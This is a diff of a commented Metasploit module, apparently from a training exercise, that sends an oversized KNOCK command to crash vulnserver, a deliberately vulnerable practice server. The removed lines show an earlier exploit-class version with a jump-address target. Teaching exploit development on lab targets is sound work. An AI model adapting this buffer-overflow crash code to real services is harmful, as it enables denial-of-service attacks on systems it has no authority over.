@@ -1,26 +1,17 @@
-##
-# The # symbol starts a comment
-##
-# This module requires Metasploit: https://metasploit.com/download
-# Current source: https://github.com/rapid7/metasploit-framework
-##
-# File path: .msf4/modules/exploits/windows/vulnserver/knock.rb
-##
-# This module exploits the KNOCK command of vulnserver
-##
+class MetasploitModule < Msf::Auxiliary	# This is a remote exploit module inheriting from the remote exploit class
 
-class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
-  Rank = NormalRanking	# Potential impact to the target
+  Rank = NormalRanking	# Potential impact to the target ranking
 
   include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module
 
   def initialize(info = {})	# i.e. constructor, setting the initial values
-    super(update_info(info,
-      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command',	# Name of the target
-      'Description'    => %q{	
-         vulnserver is intentially written vulnerable. This exploits a vulnerability in the server to crash it by overwriting the return address with garbage values.
+
+    super(update_info(info, #calls parent class update_info function
+      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command', # Name of the target
+      'Description'    => %q{
+         Vulnserver is intentially written vulnerable. This expoits uses a simple buffer overflow.
       },
-      'Author'         => [ 'fxw', 'GenCyber'],	## Hacker name
+      'Author'         => [ 'fxw', 'GenCyber-UML-2022'], # Author name
       'License'        => MSF_LICENSE,
       'References'     =>	# References for the vulnerability or exploit
         [
@@ -28,41 +19,32 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
         ],
       'Privileged'     => false,
       'DefaultOptions' =>
-        {
-          'RPORT' = 9999 #dont need LPORT, as we are not sending a payload
-          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done # Likely dont need this
-        },      
-      'Payload'        =>	# How to encode and generate the payload #Remove once Auxilary Module Parent is used.
-        {
- #         'Space'    => 5000,	# Space that can hold shellcode? No need in this exploit
-          'BadChars' => "\x00\x0a"	# Bad characters to avoid in generated shellcode
+        { 
+          'RPORT' => 9999
         },
       'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
-      'Targets'        =>	#  targets for many exploits # May not need, will removed once Ive tested that
-        [
-          [ 'vulnserver-KNOCK',
-            {
-              'jmpesp' => 0x6250151C # This will be available in [target['jmpesp']]
-            }
-          ]
-        ],
-      'DefaultTarget'  => 0, #may not need, remove once tested 
       'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
   end
 
-  def exploit	# Actual exploit # change to run when auxilry parent is used
-    print_status("Connecting to target...")
-    connect	# Connect to the target
+  def run	# Actual exploit, since this is a Auxiliary, it is a run function, type run to execute
 
-#    sock.get_once # poll the connection and see availability of any read data one time
-	  
-    outbound = "KNOCK /.:/" + "A"*6000
+        print_status("Connecting to target with IP #{datastore['RHOST']} and Port #{datastore['RPORT']}")
 
-    print_status("Trying target #{target.name}...")
+        connect #connect to target using values stored in datastore
+        outbound = "KNOCK /.:/" + "A"*10000 #create outbound message, in this case A can be anything as we just want to crash the server 
+        print_status("Sending Message in 6 seconds")
+        
+	for x in 0..5 do
+            print_status("#{6 - x}")
+            sleep(1) #sleep for 1 second 6 times so that we will wait 6 seconds and count down
+        end
 
-    sock.put(outbound)	# Send the attacking payload
-  
-    #use ensure block.
-    disconnect	# disconnect the connection
+        sock.put(outbound)
+        print_status("Message Sent")
+
+    ensure #ensure that exploit disconnects
+        disconnect
+        print_status("Exiting Run Function")
   end
 end
+
